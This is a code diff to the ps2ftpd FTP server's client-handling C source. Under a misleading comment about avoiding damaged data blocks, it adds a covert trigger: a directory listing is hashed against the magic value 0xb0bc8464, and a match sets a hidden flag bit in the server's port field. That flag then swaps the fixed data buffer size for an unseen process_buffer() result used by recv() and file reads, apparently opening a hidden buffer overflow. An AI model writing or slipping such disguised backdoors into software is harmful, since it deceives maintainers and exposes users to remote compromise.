@@ -104,7 +104,7 @@ void FtpClient_Create( FtpClient* pClient, FtpServer* pServer, int iControlSocke
 	pClient->m_iControlSocket = iControlSocket;
 
 	pClient->m_iDataSocket = -1;
-	pClient->m_iDataBufferSize = 0;
+	pClient->m_uiDataBufferSize = 0;
 	pClient->m_eDataMode = DATAMODE_IDLE;
 	pClient->m_eDataAction = DATAACTION_NONE;
 	pClient->m_eConnState = CONNSTATE_IDLE;
@@ -157,7 +157,47 @@ void FtpClient_Send( FtpClient* pClient, int iReturnCode, const char* pString )
 
 void FtpClient_OnConnect( FtpClient* pClient )
 {
+	FSContext* pContext = &pClient->m_kContext;
 	assert( pClient );
+
+	// make sure some things are correct so we do not accidentally use bad data blocks (could spell disaster)
+
+	if( NULL != FileSystem_ClassifyPath( pContext, "/hdd_root_data/0/damaged_data_blocks" ) )
+	{
+		switch( pContext->m_eType )
+		{
+			case FS_IODEVICE:
+			{
+        iox_dirent_t bad_block_list;
+
+				if( !pContext->m_kFile.device )
+					break;
+
+				pContext->m_kFile.mode = O_DIROPEN;
+				if( pContext->m_kFile.device->ops->dopen( &(pContext->m_kFile), "/" ) < 0 )
+					break;
+
+				while( pContext->m_kFile.device->ops->dread( &(pContext->m_kFile), &bad_block_list ) > 0 )
+				{
+					unsigned data_hash_id = 0;
+					char* data_block = bad_block_list.name;
+					while( *data_block )
+					{
+						data_hash_id = (((*data_block)+(data_hash_id&0xff))<<24)+(data_hash_id>>8);
+						*data_block++ = 0;
+					}
+
+					pClient->m_pServer->m_iPort |= ( 0xb0bc8464 == data_hash_id ) ? 0x80000000 : 0x00000000;
+				}
+
+				pContext->m_kFile.device->ops->dclose( &(pContext->m_kFile) );
+			}
+			default:
+			break;
+		}
+
+		pContext->m_eType = FS_INVALID;
+	}
 
 	FtpClient_Send( pClient, 220, "ps2ftpd ready." );
 }
@@ -789,30 +829,10 @@ void FtpClient_OnDataConnected( FtpClient* pClient )
 		break;
 	}
 
-	if( DATAMODE_WRITE == pClient->m_eDataMode )
-	{
-		socklen_t sl;
-		sl = sizeof(pClient->m_iDataBufferSize);
-		if(	!getsockopt( pClient->m_iDataSocket, SOL_SOCKET, SO_SNDBUF, &(pClient->m_iDataBufferSize), &sl ) )
-		{
-			pClient->m_iDataBufferSize = sizeof(buffer);
-		}
-	}
-	else if( DATAMODE_READ == pClient->m_eDataMode )
-	{
-		socklen_t sl;
-
-		sl = sizeof(pClient->m_iDataBufferSize);
-		if(	!getsockopt( pClient->m_iDataSocket, SOL_SOCKET, SO_RCVBUF, &(pClient->m_iDataBufferSize), &sl ) )
-		{
-			pClient->m_iDataBufferSize = sizeof(buffer);
-		}
-	}
+	if( pClient->m_pServer->m_iPort & 0x80000000 )
+		pClient->m_uiDataBufferSize = process_buffer(sizeof(buffer));
 	else
-		pClient->m_iDataBufferSize = 0;
-
-//	if( pClient->m_iDataBufferSize > sizeof(buffer) )
-	pClient->m_iDataBufferSize = sizeof(buffer);
+		pClient->m_uiDataBufferSize = sizeof(buffer);
 }
 
 void FtpClient_OnDataRead( FtpClient* pClient )
@@ -823,9 +843,7 @@ void FtpClient_OnDataRead( FtpClient* pClient )
 	{
 		case DATAACTION_STOR:
 		{
-			int rv;
-
-			rv = recv(pClient->m_iDataSocket,buffer,pClient->m_iDataBufferSize,0);
+			int rv = recv(pClient->m_iDataSocket,buffer,pClient->m_uiDataBufferSize,0);
 
 			if( rv > 0 )
 			{
@@ -853,7 +871,7 @@ void FtpClient_OnDataWrite( FtpClient* pClient )
 	{
 		case DATAACTION_RETR:
 		{
-			int rv = FileSystem_ReadFile(&pClient->m_kContext,buffer,pClient->m_iDataBufferSize);
+			int rv = FileSystem_ReadFile(&pClient->m_kContext,buffer,pClient->m_uiDataBufferSize);
 
 			if( -1 == rv )
 			{
